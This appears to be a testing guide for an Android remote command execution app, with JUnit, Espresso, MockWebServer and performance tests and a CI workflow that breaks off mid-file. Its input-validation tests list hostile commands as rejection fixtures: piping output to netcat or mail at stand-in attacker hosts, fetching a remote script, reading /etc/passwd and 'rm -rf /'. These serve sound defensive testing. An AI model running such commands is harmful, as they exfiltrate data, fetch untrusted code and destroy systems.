# 09 - Testing Guide

## Table of Contents
1. [Testing Strategy Overview](#testing-strategy-overview)
2. [Test Environment Setup](#test-environment-setup)
3. [Unit Testing](#unit-testing)
4. [Integration Testing](#integration-testing)
5. [UI Testing](#ui-testing)
6. [Network Testing](#network-testing)
7. [Security Testing](#security-testing)
8. [Performance Testing](#performance-testing)
9. [Manual Testing Procedures](#manual-testing-procedures)
10. [Test Automation and CI/CD](#test-automation-and-cicd)

---

## Testing Strategy Overview

The Remote System APK testing strategy follows the **Test Pyramid** approach, ensuring comprehensive coverage across all application layers:

```
                    ┌─────────────────┐
                    │   Manual Tests  │ (Few)
                    │   E2E Testing   │
                ┌───┴─────────────────┴───┐
                │   Integration Tests     │ (Some)
                │   API & Component       │
            ┌───┴─────────────────────────┴───┐
            │        Unit Tests               │ (Many)
            │    Functions & Classes          │
            └─────────────────────────────────┘
```

### Testing Levels
1. **Unit Tests (70%)**: Individual components and functions
2. **Integration Tests (20%)**: Component interactions and APIs
3. **UI/E2E Tests (10%)**: Complete user workflows

### Quality Metrics
- **Code Coverage**: Target 80%+ for critical components
- **Test Execution Time**: < 5 minutes for full suite
- **Test Reliability**: > 95% pass rate in stable environment
- **Bug Detection**: Early detection in development cycle

---

## Test Environment Setup

### 1. Android Testing Framework Setup

#### Test Dependencies (app/build.gradle)
```gradle
dependencies {
    // Unit testing
    testImplementation 'junit:junit:4.13.2'
    testImplementation 'org.mockito:mockito-core:4.6.1'
    testImplementation 'org.mockito:mockito-inline:4.6.1'
    testImplementation 'org.robolectric:robolectric:4.8.1'
    testImplementation 'androidx.test:core:1.4.0'
    testImplementation 'androidx.test.ext:junit:1.1.3'
    testImplementation 'androidx.arch.core:core-testing:2.1.0'
    testImplementation 'org.jetbrains.kotlinx:kotlinx-coroutines-test:1.6.1'
    
    // Mock web server for network testing
    testImplementation 'com.squareup.okhttp3:mockwebserver:4.9.3'
    
    // Android instrumentation testing
    androidTestImplementation 'androidx.test.ext:junit:1.1.3'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.4.0'
    androidTestImplementation 'androidx.test.espresso:espresso-intents:3.4.0'
    androidTestImplementation 'androidx.test.espresso:espresso-contrib:3.4.0'
    androidTestImplementation 'androidx.test:runner:1.4.0'
    androidTestImplementation 'androidx.test:rules:1.4.0'
    androidTestImplementation 'androidx.test.uiautomator:uiautomator:2.2.0'
    
    // Fragment testing
    debugImplementation 'androidx.fragment:fragment-testing:1.5.0'
}
```

#### Test Configuration
```gradle
android {
    testOptions {
        unitTests {
            includeAndroidResources = true
            returnDefaultValues = true
        }
        
        animationsDisabled = true
        
        execution = 'ANDROIDX_TEST_ORCHESTRATOR'
    }
    
    // Test BuildConfig fields
    buildTypes {
        debug {
            testCoverageEnabled true
            buildConfigField "String", "TEST_SERVER_URL", '"http://localhost:8080"'
        }
    }
}
```

### 2. Test Directory Structure
```
app/src/
├── test/                          # Unit tests
│   ├── java/com/remotesystem/
│   │   ├── network/              # Network layer tests
│   │   ├── security/             # Security component tests
│   │   ├── services/             # Service tests
│   │   ├── utils/                # Utility tests
│   │   └── viewmodels/           # ViewModel tests
│   └── resources/                # Test resources
│       ├── mockresponses/        # Mock API responses
│       └── test-config.properties
│
├── androidTest/                   # Instrumentation tests
│   ├── java/com/remotesystem/
│   │   ├── activities/           # Activity tests
│   │   ├── fragments/            # Fragment tests
│   │   ├── integration/          # Integration tests
│   │   └── utils/                # Test utilities
│   └── assets/                   # Test assets
│
└── sharedTest/                    # Shared test utilities
    └── java/com/remotesystem/
        ├── TestDataFactory.java
        ├── MockNetworkService.java
        └── TestConstants.java
```

---

## Unit Testing

### 1. Service Layer Testing

#### RemoteService Test
```java
@RunWith(MockitoJUnitRunner.class)
public class RemoteServiceTest {
    
    @Mock
    private NetworkManager mockNetworkManager;
    
    @Mock
    private SecurityManager mockSecurityManager;
    
    @Mock
    private Context mockContext;
    
    private RemoteService remoteService;
    
    @Before
    public void setup() {
        remoteService = new RemoteService();
        remoteService.setNetworkManager(mockNetworkManager);
        remoteService.setSecurityManager(mockSecurityManager);
    }
    
    @Test
    public void testConnectToServer_Success() {
        // Arrange
        ConnectionConfig config = new ConnectionConfig("192.168.1.100", 8080, false);
        when(mockSecurityManager.authenticate(config)).thenReturn(AuthResult.success());
        when(mockNetworkManager.connect(config)).thenReturn(true);
        
        // Act
        boolean result = remoteService.connectToServer(config);
        
        // Assert
        assertTrue("Connection should succeed", result);
        verify(mockNetworkManager).connect(config);
        verify(mockSecurityManager).authenticate(config);
    }
    
    @Test
    public void testConnectToServer_AuthenticationFailure() {
        // Arrange
        ConnectionConfig config = new ConnectionConfig("192.168.1.100", 8080, true);
        when(mockSecurityManager.authenticate(config)).thenReturn(
            AuthResult.failure("Invalid credentials"));
        
        // Act
        boolean result = remoteService.connectToServer(config);
        
        // Assert
        assertFalse("Connection should fail on auth error", result);
        verify(mockSecurityManager).authenticate(config);
        verifyNoInteractions(mockNetworkManager);
    }
    
    @Test
    public void testExecuteCommand_ValidCommand() {
        // Arrange
        String command = "ls -la";
        when(mockSecurityManager.validateCommand(command)).thenReturn(true);
        when(mockNetworkManager.isConnected()).thenReturn(true);
        
        CommandResult expectedResult = new CommandResult(true, "file1.txt\nfile2.txt", "");
        when(mockNetworkManager.sendCommand(command)).thenReturn(expectedResult);
        
        // Act
        CommandResult result = remoteService.executeCommand(command);
        
        // Assert
        assertNotNull("Result should not be null", result);
        assertTrue("Command should succeed", result.isSuccess());
        assertEquals("Output should match", "file1.txt\nfile2.txt", result.getOutput());
        verify(mockSecurityManager).validateCommand(command);
        verify(mockNetworkManager).sendCommand(command);
    }
    
    @Test
    public void testExecuteCommand_InvalidCommand() {
        // Arrange
        String command = "rm -rf /";
        when(mockSecurityManager.validateCommand(command)).thenReturn(false);
        
        // Act
        CommandResult result = remoteService.executeCommand(command);
        
        // Assert
        assertNotNull("Result should not be null", result);
        assertFalse("Command should fail", result.isSuccess());
        assertTrue("Error should mention unauthorized", 
            result.getError().contains("unauthorized"));
        verify(mockSecurityManager).validateCommand(command);
        verifyNoInteractions(mockNetworkManager);
    }
}
```

### 2. Network Layer Testing

#### NetworkManager Test with MockWebServer
```java
@RunWith(RobolectricTestRunner.class)
public class NetworkManagerTest {
    
    private MockWebServer mockWebServer;
    private NetworkManager networkManager;
    
    @Before
    public void setup() throws IOException {
        mockWebServer = new MockWebServer();
        mockWebServer.start();
        
        String baseUrl = mockWebServer.url("/").toString();
        networkManager = new NetworkManager(baseUrl);
    }
    
    @After
    public void tearDown() throws IOException {
        mockWebServer.shutdown();
    }
    
    @Test
    public void testSendCommand_Success() throws InterruptedException {
        // Arrange
        String responseBody = "{\"success\":true,\"output\":\"Hello World\",\"error\":\"\"}";
        mockWebServer.enqueue(new MockResponse()
            .setResponseCode(200)
            .setHeader("Content-Type", "application/json")
            .setBody(responseBody));
        
        // Act
        CommandResult result = networkManager.sendCommand("echo 'Hello World'");
        
        // Assert
        assertNotNull("Result should not be null", result);
        assertTrue("Command should succeed", result.isSuccess());
        assertEquals("Output should match", "Hello World", result.getOutput());
        
        // Verify request
        RecordedRequest request = mockWebServer.takeRequest();
        assertEquals("POST", request.getMethod());
        assertEquals("/api/command", request.getPath());
    }
    
    @Test
    public void testSendCommand_NetworkError() {
        // Arrange
        mockWebServer.enqueue(new MockResponse()
            .setResponseCode(500)
            .setBody("Internal Server Error"));
        
        // Act
        CommandResult result = networkManager.sendCommand("ls");
        
        // Assert
        assertNotNull("Result should not be null", result);
        assertFalse("Command should fail", result.isSuccess());
        assertTrue("Error should contain server error", 
            result.getError().contains("Server error"));
    }
    
    @Test
    public void testConnectionTimeout() {
        // Arrange
        mockWebServer.enqueue(new MockResponse()
            .setBodyDelay(10, TimeUnit.SECONDS));
        
        // Act & Assert
        assertThrows("Should throw timeout exception", 
            SocketTimeoutException.class, 
            () -> networkManager.sendCommand("sleep 10"));
    }
}
```

### 3. Security Component Testing

#### SecurityManager Test
```java
@RunWith(JUnit4.class)
public class SecurityManagerTest {
    
    private SecurityManager securityManager;
    
    @Before
    public void setup() {
        securityManager = new SecurityManager();
    }
    
    @Test
    public void testValidateCommand_AllowedCommands() {
        // Test allowed commands
        String[] allowedCommands = {"ls", "pwd", "whoami", "date", "uptime"};
        
        for (String command : allowedCommands) {
            assertTrue("Command should be allowed: " + command, 
                securityManager.validateCommand(command));
        }
    }
    
    @Test
    public void testValidateCommand_DisallowedCommands() {
        // Test disallowed commands
        String[] disallowedCommands = {"rm -rf", "shutdown", "reboot", "dd if="};
        
        for (String command : disallowedCommands) {
            assertFalse("Command should be disallowed: " + command, 
                securityManager.validateCommand(command));
        }
    }
    
    @Test
    public void testEncryptionDecryption() {
        // Arrange
        securityManager.setSecureMode(true);
        String originalMessage = "This is a test message";
        
        // Act
        String encrypted = securityManager.encryptMessage(originalMessage);
        String decrypted = securityManager.decryptMessage(encrypted);
        
        // Assert
        assertNotEquals("Encrypted message should differ from original", 
            originalMessage, encrypted);
        assertEquals("Decrypted message should match original", 
            originalMessage, decrypted);
    }
    
    @Test
    public void testPasswordHashing() {
        // Arrange
        String password = "testPassword123";
        
        // Act
        String hashed1 = securityManager.hashPassword(password);
        String hashed2 = securityManager.hashPassword(password);
        
        // Assert
        assertNotEquals("Hashes should be different (salt)", hashed1, hashed2);
        assertTrue("Password should verify against first hash", 
            securityManager.verifyPassword(password, hashed1));
        assertTrue("Password should verify against second hash", 
            securityManager.verifyPassword(password, hashed2));
    }
}
```

---

## Integration Testing

### 1. End-to-End Service Integration

#### RemoteSystemIntegrationTest
```java
@RunWith(AndroidJUnit4.class)
@LargeTest
public class RemoteSystemIntegrationTest {
    
    private RemoteService remoteService;
    private TestServer testServer;
    
    @Before
    public void setup() throws Exception {
        // Start test server
        testServer = new TestServer(8080);
        testServer.start();
        
        // Initialize service
        remoteService = new RemoteService();
        remoteService.initialize(InstrumentationRegistry.getInstrumentation().getTargetContext());
    }
    
    @After
    public void tearDown() throws Exception {
        if (testServer != null) {
            testServer.stop();
        }
        if (remoteService != null) {
            remoteService.cleanup();
        }
    }
    
    @Test
    public void testFullConnectionWorkflow() throws Exception {
        // Arrange
        ConnectionConfig config = new ConnectionConfig("localhost", 8080, false);
        CountDownLatch connectionLatch = new CountDownLatch(1);
        AtomicBoolean connectionSuccess = new AtomicBoolean(false);
        
        // Act
        remoteService.connectToServer(config, new ConnectionCallback() {
            @Override
            public void onSuccess() {
                connectionSuccess.set(true);
                connectionLatch.countDown();
            }
            
            @Override
            public void onFailure(String error) {
                connectionLatch.countDown();
            }
        });
        
        // Assert
        assertTrue("Connection should complete within timeout", 
            connectionLatch.await(10, TimeUnit.SECONDS));
        assertTrue("Connection should succeed", connectionSuccess.get());
        assertTrue("Service should be connected", remoteService.isConnected());
    }
    
    @Test
    public void testCommandExecutionWorkflow() throws Exception {
        // Arrange - establish connection first
        ConnectionConfig config = new ConnectionConfig("localhost", 8080, false);
        remoteService.connectToServerSync(config);
        
        CountDownLatch commandLatch = new CountDownLatch(1);
        AtomicReference<CommandResult> commandResult = new AtomicReference<>();
        
        // Act
        remoteService.executeCommand("echo 'test'", new CommandCallback() {
            @Override
            public void onSuccess(CommandResult result) {
                commandResult.set(result);
                commandLatch.countDown();
            }
            
            @Override
            public void onFailure(String error) {
                commandResult.set(new CommandResult(false, "", error));
                commandLatch.countDown();
            }
        });
        
        // Assert
        assertTrue("Command should complete within timeout", 
            commandLatch.await(5, TimeUnit.SECONDS));
        assertNotNull("Command result should not be null", commandResult.get());
        assertTrue("Command should succeed", commandResult.get().isSuccess());
        assertEquals("Output should match expected", "test", 
            commandResult.get().getOutput().trim());
    }
}
```

### 2. Database Integration Testing (if applicable)

#### PreferencesManager Test
```java
@RunWith(AndroidJUnit4.class)
public class PreferencesManagerIntegrationTest {
    
    private PreferencesManager preferencesManager;
    private Context context;
    
    @Before
    public void setup() {
        context = InstrumentationRegistry.getInstrumentation().getTargetContext();
        preferencesManager = new PreferencesManager(context);
        
        // Clear any existing preferences
        preferencesManager.clearAll();
    }
    
    @Test
    public void testSaveAndLoadConnectionConfig() {
        // Arrange
        ConnectionConfig originalConfig = new ConnectionConfig(
            "192.168.1.100", 8080, true);
        
        // Act
        preferencesManager.saveConnectionConfig(originalConfig);
        ConnectionConfig loadedConfig = preferencesManager.loadConnectionConfig();
        
        // Assert
        assertNotNull("Loaded config should not be null", loadedConfig);
        assertEquals("Server IP should match", 
            originalConfig.getServerIP(), loadedConfig.getServerIP());
        assertEquals("Server port should match", 
            originalConfig.getServerPort(), loadedConfig.getServerPort());
        assertEquals("Secure mode should match", 
            originalConfig.isSecure(), loadedConfig.isSecure());
    }
    
    @Test
    public void testMultipleConfigurationUpdates() {
        // Test that multiple updates work correctly
        ConnectionConfig config1 = new ConnectionConfig("192.168.1.100", 8080, false);
        ConnectionConfig config2 = new ConnectionConfig("192.168.1.200", 9090, true);
        
        // Save first config
        preferencesManager.saveConnectionConfig(config1);
        ConnectionConfig loaded1 = preferencesManager.loadConnectionConfig();
        assertEquals("First config should be loaded", config1.getServerIP(), loaded1.getServerIP());
        
        // Save second config
        preferencesManager.saveConnectionConfig(config2);
        ConnectionConfig loaded2 = preferencesManager.loadConnectionConfig();
        assertEquals("Second config should be loaded", config2.getServerIP(), loaded2.getServerIP());
        assertEquals("Secure mode should be updated", true, loaded2.isSecure());
    }
}
```

---

## UI Testing

### 1. Activity Testing with Espresso

#### MainActivity UI Test
```java
@RunWith(AndroidJUnit4.class)
@LargeTest
public class MainActivityTest {
    
    @Rule
    public ActivityScenarioRule<MainActivity> activityScenarioRule = 
        new ActivityScenarioRule<>(MainActivity.class);
    
    @Rule
    public GrantPermissionRule permissionRule = 
        GrantPermissionRule.grant(Manifest.permission.INTERNET);
    
    @Test
    public void testMainActivityLaunch() {
        // Verify main UI elements are displayed
        onView(withId(R.id.toolbar))
            .check(matches(isDisplayed()));
        
        onView(withId(R.id.nav_drawer))
            .check(matches(isDisplayed()));
        
        onView(withId(R.id.fragment_container))
            .check(matches(isDisplayed()));
    }
    
    @Test
    public void testConnectionDialogFlow() {
        // Open connection dialog
        onView(withId(R.id.btn_connect))
            .perform(click());
        
        // Verify dialog is displayed
        onView(withText("Connect to Server"))
            .check(matches(isDisplayed()));
        
        // Fill in connection details
        onView(withId(R.id.et_server_ip))
            .perform(typeText("192.168.1.100"));
        
        onView(withId(R.id.et_server_port))
            .perform(typeText("8080"));
        
        // Close keyboard
        onView(withId(R.id.et_server_port))
            .perform(closeSoftKeyboard());
        
        // Test connection
        onView(withId(R.id.btn_test_connection))
            .perform(click());
        
        // Wait for connection test result
        onView(withText("Connection test completed"))
            .inRoot(withDecorView(not(is(activityScenarioRule.getScenario()
                .getResult().getResultData().getDecorView()))))
            .check(matches(isDisplayed()));
    }
    
    @Test
    public void testNavigationDrawer() {
        // Open navigation drawer
        onView(withId(R.id.drawer_layout))
            .perform(DrawerActions.open());
        
        // Verify navigation items
        onView(withText("Dashboard"))
            .check(matches(isDisplayed()));
        
        onView(withText("Commands"))
            .check(matches(isDisplayed()));
        
        onView(withText("Settings"))
            .check(matches(isDisplayed()));
        
        // Navigate to settings
        onView(withText("Settings"))
            .perform(click());
        
        // Verify settings fragment is loaded
        onView(withId(R.id.settings_container))
            .check(matches(isDisplayed()));
    }
}
```

### 2. Fragment Testing

#### CommandFragment Test
```java
@RunWith(AndroidJUnit4.class)
public class CommandFragmentTest {
    
    @Rule
    public FragmentScenarioRule<CommandFragment> fragmentScenarioRule = 
        new FragmentScenarioRule<>(CommandFragment.class);
    
    @Test
    public void testCommandListDisplay() {
        // Verify command list is displayed
        onView(withId(R.id.recycler_commands))
            .check(matches(isDisplayed()));
        
        // Verify at least one command item exists
        onView(withId(R.id.recycler_commands))
            .check(matches(hasMinimumChildCount(1)));
    }
    
    @Test
    public void testCommandExecution() {
        // Click on first command
        onView(withId(R.id.recycler_commands))
            .perform(RecyclerViewActions.actionOnItemAtPosition(0, click()));
        
        // Verify command execution dialog
        onView(withText("Execute Command"))
            .check(matches(isDisplayed()));
        
        // Confirm execution
        onView(withText("Execute"))
            .perform(click());
        
        // Verify progress indicator
        onView(withId(R.id.progress_execution))
            .check(matches(isDisplayed()));
    }
    
    @Test
    public void testCustomCommandInput() {
        // Open custom command input
        onView(withId(R.id.fab_custom_command))
            .perform(click());
        
        // Enter custom command
        onView(withId(R.id.et_custom_command))
            .perform(typeText("ls -la"), closeSoftKeyboard());
        
        // Execute command
        onView(withId(R.id.btn_execute_custom))
            .perform(click());
        
        // Verify execution starts
        onView(withId(R.id.progress_custom_execution))
            .check(matches(isDisplayed()));
    }
}
```

---

## Network Testing

### 1. API Integration Testing

#### Server Communication Test
```java
@RunWith(AndroidJUnit4.class)
public class NetworkIntegrationTest {
    
    private MockWebServer mockServer;
    private ApiService apiService;
    
    @Before
    public void setup() throws IOException {
        mockServer = new MockWebServer();
        mockServer.start();
        
        String baseUrl = mockServer.url("/").toString();
        apiService = ApiServiceFactory.create(baseUrl);
    }
    
    @After
    public void tearDown() throws IOException {
        mockServer.shutdown();
    }
    
    @Test
    public void testCommandExecution_Success() throws Exception {
        // Arrange
        String responseJson = "{"
            + "\"success\": true,"
            + "\"output\": \"total 8\\ndrwxr-xr-x 2 user user 4096 Jan 1 12:00 .\\n\","
            + "\"error\": \"\""
            + "}";
        
        mockServer.enqueue(new MockResponse()
            .setResponseCode(200)
            .setHeader("Content-Type", "application/json")
            .setBody(responseJson));
        
        // Act
        Response<CommandResponse> response = apiService.executeCommand(
            new CommandRequest("ls -la")).execute();
        
        // Assert
        assertTrue("Response should be successful", response.isSuccessful());
        assertNotNull("Response body should not be null", response.body());
        assertTrue("Command should succeed", response.body().isSuccess());
        assertTrue("Output should contain directory listing", 
            response.body().getOutput().contains("drwxr-xr-x"));
        
        // Verify request
        RecordedRequest request = mockServer.takeRequest();
        assertEquals("POST", request.getMethod());
        assertTrue("Request should contain command", 
            request.getBody().readUtf8().contains("ls -la"));
    }
    
    @Test
    public void testNetworkTimeout() {
        // Arrange
        mockServer.enqueue(new MockResponse()
            .setBodyDelay(30, TimeUnit.SECONDS));
        
        // Act & Assert
        assertThrows("Should timeout", IOException.class, () -> {
            apiService.executeCommand(new CommandRequest("sleep 30")).execute();
        });
    }
    
    @Test
    public void testServerError_Handling() throws Exception {
        // Arrange
        mockServer.enqueue(new MockResponse()
            .setResponseCode(500)
            .setBody("Internal Server Error"));
        
        // Act
        Response<CommandResponse> response = apiService.executeCommand(
            new CommandRequest("test")).execute();
        
        // Assert
        assertFalse("Response should not be successful", response.isSuccessful());
        assertEquals("Should return 500 error", 500, response.code());
    }
}
```

### 2. Socket Communication Testing

#### Real-time Communication Test
```java
@RunWith(AndroidJUnit4.class)
public class SocketCommunicationTest {
    
    private TestSocketServer testServer;
    private SocketManager socketManager;
    
    @Before
    public void setup() throws Exception {
        testServer = new TestSocketServer(9090);
        testServer.start();
        
        socketManager = new SocketManager();
    }
    
    @After
    public void tearDown() throws Exception {
        if (socketManager != null) {
            socketManager.disconnect();
        }
        if (testServer != null) {
            testServer.stop();
        }
    }
    
    @Test
    public void testSocketConnection() throws Exception {
        // Arrange
        CountDownLatch connectionLatch = new CountDownLatch(1);
        AtomicBoolean connected = new AtomicBoolean(false);
        
        // Act
        socketManager.connect("localhost", 9090, new SocketListener() {
            @Override
            public void onConnected() {
                connected.set(true);
                connectionLatch.countDown();
            }
            
            @Override
            public void onDisconnected() {
                connectionLatch.countDown();
            }
            
            @Override
            public void onError(Exception error) {
                connectionLatch.countDown();
            }
        });
        
        // Assert
        assertTrue("Socket should connect within timeout", 
            connectionLatch.await(10, TimeUnit.SECONDS));
        assertTrue("Socket should be connected", connected.get());
    }
    
    @Test
    public void testMessageExchange() throws Exception {
        // Establish connection first
        socketManager.connectSync("localhost", 9090);
        
        CountDownLatch messageLatch = new CountDownLatch(1);
        AtomicReference<String> receivedMessage = new AtomicReference<>();
        
        // Set message listener
        socketManager.setMessageListener(message -> {
            receivedMessage.set(message);
            messageLatch.countDown();
        });
        
        // Send test message
        socketManager.sendMessage("ping");
        
        // Wait for response
        assertTrue("Should receive response within timeout", 
            messageLatch.await(5, TimeUnit.SECONDS));
        assertEquals("Should receive pong response", "pong", receivedMessage.get());
    }
}
```

---

## Security Testing

### 1. Authentication Testing

#### Security Component Test
```java
@RunWith(AndroidJUnit4.class)
public class SecurityIntegrationTest {
    
    private SecurityManager securityManager;
    private Context context;
    
    @Before
    public void setup() {
        context = InstrumentationRegistry.getInstrumentation().getTargetContext();
        securityManager = new SecurityManager(context);
    }
    
    @Test
    public void testSecureKeyStorage() {
        // Arrange
        String testKey = "test_encryption_key_123";
        
        // Act
        securityManager.storeSecureKey("test_key", testKey);
        String retrievedKey = securityManager.getSecureKey("test_key");
        
        // Assert
        assertEquals("Retrieved key should match stored key", testKey, retrievedKey);
    }
    
    @Test
    public void testEncryptionWithStoredKey() {
        // Arrange
        securityManager.generateAndStoreKey("encryption_key");
        String plaintext = "This is sensitive data";
        
        // Act
        String encrypted = securityManager.encrypt(plaintext, "encryption_key");
        String decrypted = securityManager.decrypt(encrypted, "encryption_key");
        
        // Assert
        assertNotEquals("Encrypted data should differ from plaintext", plaintext, encrypted);
        assertEquals("Decrypted data should match original", plaintext, decrypted);
    }
    
    @Test
    public void testCertificatePinning() throws Exception {
        // Test certificate pinning implementation
        SSLContext sslContext = securityManager.createPinnedSSLContext();
        assertNotNull("SSL context should be created", sslContext);
        
        // Test connection with valid certificate
        assertTrue("Should accept valid certificate", 
            securityManager.validateCertificate(getValidTestCertificate()));
        
        // Test connection with invalid certificate
        assertFalse("Should reject invalid certificate", 
            securityManager.validateCertificate(getInvalidTestCertificate()));
    }
}
```

### 2. Input Validation Testing

#### Command Validation Test
```java
@RunWith(JUnit4.class)
public class InputValidationTest {
    
    private CommandValidator commandValidator;
    
    @Before
    public void setup() {
        commandValidator = new CommandValidator();
    }
    
    @Test
    public void testSQLInjectionPrevention() {
        String[] maliciousInputs = {
            "ls'; DROP TABLE users; --",
            "pwd && rm -rf /",
            "whoami | nc attacker.com 4444",
            "date; wget http://malicious.com/script.sh"
        };
        
        for (String input : maliciousInputs) {
            assertFalse("Should reject malicious input: " + input, 
                commandValidator.isValid(input));
        }
    }
    
    @Test
    public void testCommandInjectionPrevention() {
        String[] injectionAttempts = {
            "ls && cat /etc/passwd",
            "pwd; rm important_file.txt",
            "whoami | mail hacker@evil.com",
            "date > /dev/null; shutdown -h now"
        };
        
        for (String attempt : injectionAttempts) {
            assertFalse("Should prevent command injection: " + attempt, 
                commandValidator.isValid(attempt));
        }
    }
    
    @Test
    public void testValidCommands() {
        String[] validCommands = {
            "ls",
            "ls -la",
            "pwd",
            "whoami",
            "date",
            "uptime"
        };
        
        for (String command : validCommands) {
            assertTrue("Should accept valid command: " + command, 
                commandValidator.isValid(command));
        }
    }
}
```

---

## Performance Testing

### 1. Memory Usage Testing

#### Memory Performance Test
```java
@RunWith(AndroidJUnit4.class)
public class MemoryPerformanceTest {
    
    @Test
    public void testMemoryUsageDuringBulkOperations() {
        // Get initial memory usage
        long initialMemory = getUsedMemory();
        
        // Perform bulk operations
        RemoteService service = new RemoteService();
        for (int i = 0; i < 1000; i++) {
            service.executeCommand("echo 'test " + i + "'");
        }
        
        // Force garbage collection
        System.gc();
        Thread.sleep(1000);
        
        // Check final memory usage
        long finalMemory = getUsedMemory();
        long memoryIncrease = finalMemory - initialMemory;
        
        // Assert memory increase is reasonable (< 50MB)
        assertTrue("Memory increase should be reasonable: " + memoryIncrease + " bytes", 
            memoryIncrease < 50 * 1024 * 1024);
    }
    
    @Test
    public void testMemoryLeakDetection() {
        WeakReference<RemoteService> serviceRef = performNetworkOperations();
        
        // Force garbage collection multiple times
        for (int i = 0; i < 5; i++) {
            System.gc();
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
        
        // Check if service was garbage collected
        assertNull("Service should be garbage collected to prevent memory leaks", 
            serviceRef.get());
    }
    
    private WeakReference<RemoteService> performNetworkOperations() {
        RemoteService service = new RemoteService();
        // Perform operations
        service.connectToServer(new ConnectionConfig("localhost", 8080, false));
        service.executeCommand("test");
        service.disconnect();
        
        return new WeakReference<>(service);
    }
    
    private long getUsedMemory() {
        Runtime runtime = Runtime.getRuntime();
        return runtime.totalMemory() - runtime.freeMemory();
    }
}
```

### 2. Network Performance Testing

#### Network Performance Test
```java
@RunWith(AndroidJUnit4.class)
public class NetworkPerformanceTest {
    
    @Test
    public void testCommandExecutionLatency() throws Exception {
        RemoteService service = new RemoteService();
        service.connectToServerSync(new ConnectionConfig("localhost", 8080, false));
        
        List<Long> executionTimes = new ArrayList<>();
        
        // Execute commands and measure time
        for (int i = 0; i < 100; i++) {
            long startTime = System.currentTimeMillis();
            
            CommandResult result = service.executeCommandSync("echo 'test'");
            
            long endTime = System.currentTimeMillis();
            long executionTime = endTime - startTime;
            
            assertTrue("Command should succeed", result.isSuccess());
            executionTimes.add(executionTime);
        }
        
        // Calculate statistics
        double averageTime = executionTimes.stream()
            .mapToLong(Long::longValue)
            .average()
            .orElse(0.0);
        
        long maxTime = executionTimes.stream()
            .mapToLong(Long::longValue)
            .max()
            .orElse(0L);
        
        // Assert performance requirements
        assertTrue("Average execution time should be under 1 second: " + averageTime + "ms", 
            averageTime < 1000);
        assertTrue("Maximum execution time should be under 5 seconds: " + maxTime + "ms", 
            maxTime < 5000);
    }
    
    @Test
    public void testConcurrentConnections() throws Exception {
        int numberOfThreads = 10;
        CountDownLatch latch = new CountDownLatch(numberOfThreads);
        AtomicInteger successCount = new AtomicInteger(0);
        
        ExecutorService executor = Executors.newFixedThreadPool(numberOfThreads);
        
        for (int i = 0; i < numberOfThreads; i++) {
            executor.submit(() -> {
                try {
                    RemoteService service = new RemoteService();
                    service.connectToServerSync(new ConnectionConfig("localhost", 8080, false));
                    
                    CommandResult result = service.executeCommandSync("whoami");
                    
                    if (result.isSuccess()) {
                        successCount.incrementAndGet();
                    }
                    
                    service.disconnect();
                } catch (Exception e) {
                    Log.e("NetworkPerformanceTest", "Error in concurrent test", e);
                } finally {
                    latch.countDown();
                }
            });
        }
        
        assertTrue("All threads should complete within timeout", 
            latch.await(30, TimeUnit.SECONDS));
        
        // At least 80% of connections should succeed
        int minSuccessCount = (int) (numberOfThreads * 0.8);
        assertTrue("Most concurrent connections should succeed: " + 
            successCount.get() + "/" + numberOfThreads, 
            successCount.get() >= minSuccessCount);
        
        executor.shutdown();
    }
}
```

---

## Manual Testing Procedures

### 1. Manual Test Cases

#### Connection Testing Checklist
```
□ Test Plan: Connection Functionality
  
  Test Case 1: Valid Server Connection
  Steps:
  1. Launch application
  2. Tap "Connect" button
  3. Enter valid server IP (e.g., 192.168.1.100)
  4. Enter valid port (e.g., 8080)
  5. Tap "Connect"
  
  Expected Result:
  - Connection established successfully
  - Status indicator shows "Connected"
  - Main interface becomes available
  
  Test Case 2: Invalid Server Connection
  Steps:
  1. Launch application
  2. Enter invalid server IP (e.g., 999.999.999.999)
  3. Tap "Connect"
  
  Expected Result:
  - Connection fails with appropriate error message
  - User remains on connection screen
  - Retry option available
  
  Test Case 3: Network Interruption
  Steps:
  1. Establish valid connection
  2. Disable WiFi/mobile data
  3. Attempt to execute command
  
  Expected Result:
  - Connection lost detected
  - User notified of connection loss
  - Automatic reconnection attempted when network restored
```

#### Command Execution Testing
```
□ Test Plan: Command Execution
  
  Test Case 1: Basic Command Execution
  Steps:
  1. Ensure connected to server
  2. Navigate to Commands section
  3. Select "List Files" command
  4. Tap Execute
  
  Expected Result:
  - Command executes successfully
  - File listing displayed
  - Execution time shown
  
  Test Case 2: Custom Command Input
  Steps:
  1. Tap "Custom Command" button
  2. Enter "pwd" command
  3. Tap Execute
  
  Expected Result:
  - Current directory path displayed
  - Command history updated
  
  Test Case 3: Invalid Command Handling
  Steps:
  1. Enter restricted command (e.g., "rm -rf /")
  2. Tap Execute
  
  Expected Result:
  - Command rejected with security warning
  - No execution occurs
  - User educated about command restrictions
```

### 2. User Acceptance Testing

#### UAT Scenarios
```
Scenario 1: First-Time User Setup
Actor: New user with basic technical knowledge
Goal: Successfully connect to remote system and execute first command

Steps:
1. Install and launch application
2. Follow setup wizard
3. Configure server connection
4. Execute "System Information" command
5. Review results

Success Criteria:
- User completes setup within 10 minutes
- Connection established without technical support
- First command executes successfully
- User understands basic interface

Scenario 2: Power User Workflow
Actor: Experienced system administrator
Goal: Efficiently manage multiple remote systems

Steps:
1. Configure multiple server connections
2. Switch between connections
3. Execute batch commands
4. Monitor system performance
5. Export command results

Success Criteria:
- Multiple connections managed efficiently
- Command execution time < 2 seconds average
- All commands complete successfully
- Results exported in usable format
```

---

## Test Automation and CI/CD

### 1. Automated Test Pipeline

#### GitHub Actions Test Workflow
```yaml
name: Android Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up JDK 11
      uses: actions/setup-java@v3
      with:
        java-version: '11'
        distribution: 'temurin'
        
    - name: Cache Gradle packages
      uses: actions/cache@v3
      with:
        path: |
          ~/.gradle/caches
          ~/.gradle/wrapper
        key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*') }}
        
    - name: Run unit tests
      run: |
        cd APK
        ./gradlew test
        
    - name: Generate test report
      run: |
        cd APK
        ./gradlew jacocoTestReport
        
    - name: Upload test results
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: test-results
        path: APK/app/build/reports/tests/
        
    - name: Upload coverage reports
      uses: actions/upload-artifact@v3
      with:
        name: coverage-reports
